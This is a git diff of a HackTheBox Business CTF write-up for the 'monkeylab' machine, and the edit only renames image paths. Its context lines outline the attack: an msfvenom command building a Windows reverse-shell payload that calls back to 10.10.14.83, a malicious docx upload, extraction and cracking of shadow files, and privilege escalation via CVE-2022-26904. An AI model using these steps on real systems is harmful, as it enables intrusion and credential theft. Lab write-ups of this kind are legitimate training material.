@@ -9,11 +9,11 @@ This is an "easy" machine from [HackTheBox Business CTF](https://www.hackthebox.
 Enumeration:
 
 {:refdef: style="text-align: center;"}
-![rustscan](/assets/ctf/htb_dirty_money/monkeylab/1.png)
+![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/1.png)
 {: refdef}
 
 {:refdef: style="text-align: center;"}
-![rustscan](/assets/ctf/htb_dirty_money/monkeylab/2.png)
+![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/2.png)
 {: refdef}
 
 <p style='text-align: justify;'>
@@ -26,7 +26,7 @@ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.83 lport=445 -f exe -o 
 </p>
 
 {:refdef: style="text-align: center;"}
-![rustscan](/assets/ctf/htb_dirty_money/monkeylab/3.png)
+![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/3.png)
 {: refdef}
 
 <p style='text-align: justify;'>
@@ -40,7 +40,7 @@ This script will create a docx document that we are going to upload to the servi
 </p>
 
 {:refdef: style="text-align: center;"}
-![rustscan](/assets/ctf/htb_dirty_money/monkeylab/4.png)
+![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/4.png)
 {: refdef}
 
 <p style='text-align: justify;'>
@@ -48,7 +48,7 @@ After a minute or two we get a callback to our server running on port 8080 to re
 </p>
 
 {:refdef: style="text-align: center;"}
-![rustscan](/assets/ctf/htb_dirty_money/monkeylab/5.png)
+![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/5.png)
 {: refdef}
 
 <p style='text-align: justify;'>
@@ -56,7 +56,7 @@ So after enumerating for a while and running winPeas.exe i found two interesting
 </p>
 
 {:refdef: style="text-align: center;"}
-![rustscan](/assets/ctf/htb_dirty_money/monkeylab/6.png)
+![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/6.png)
 {: refdef}
 
 <p style='text-align: justify;'>
@@ -64,17 +64,17 @@ Next, i discover that the current user has wsl.exe installed on their session. V
 </p>
 
 {:refdef: style="text-align: center;"}
-![rustscan](/assets/ctf/htb_dirty_money/monkeylab/7.png)
+![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/7.png)
 {: refdef}
 
 Knowing this, we can extract shadow and passwd files:
 
 {:refdef: style="text-align: center;"}
-![rustscan](/assets/ctf/htb_dirty_money/monkeylab/8.png)
+![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/8.png)
 {: refdef}
 
 {:refdef: style="text-align: center;"}
-![rustscan](/assets/ctf/htb_dirty_money/monkeylab/9.png)
+![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/9.png)
 {: refdef}
 
 <p style='text-align: justify;'>
@@ -82,7 +82,7 @@ We crack the files using unshadow (to create the john hash) and john. We obtain 
 </p>
 
 {:refdef: style="text-align: center;"}
-![rustscan](/assets/ctf/htb_dirty_money/monkeylab/10.png)
+![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/10.png)
 {: refdef}
 
 <p style='text-align: justify;'>
@@ -90,11 +90,11 @@ You can verify that the credentials are valid (on the windows machine) using a l
 </p>
 
 {:refdef: style="text-align: center;"}
-![rustscan](/assets/ctf/htb_dirty_money/monkeylab/11.png)
+![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/11.png)
 {: refdef}
 
 {:refdef: style="text-align: center;"}
-![rustscan](/assets/ctf/htb_dirty_money/monkeylab/12.png)
+![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/12.png)
 {: refdef}
 
 <p style='text-align: justify;'>
@@ -102,20 +102,20 @@ Since we have two valid users, we can use CVE-2022-26904 to escalate privileges.
 </p>
 
 {:refdef: style="text-align: center;"}
-![rustscan](/assets/ctf/htb_dirty_money/monkeylab/13.png)
+![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/13.png)
 {: refdef}
 
 {:refdef: style="text-align: center;"}
-![rustscan](/assets/ctf/htb_dirty_money/monkeylab/14.png)
+![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/14.png)
 {: refdef}
 
 We are now ready to use the msfconsole module:
 
 {:refdef: style="text-align: center;"}
-![rustscan](/assets/ctf/htb_dirty_money/monkeylab/15.png)
+![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/15.png)
 {: refdef}
 
 {:refdef: style="text-align: center;"}
-![rustscan](/assets/ctf/htb_dirty_money/monkeylab/16.png)
+![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/16.png)
 {: refdef}
 
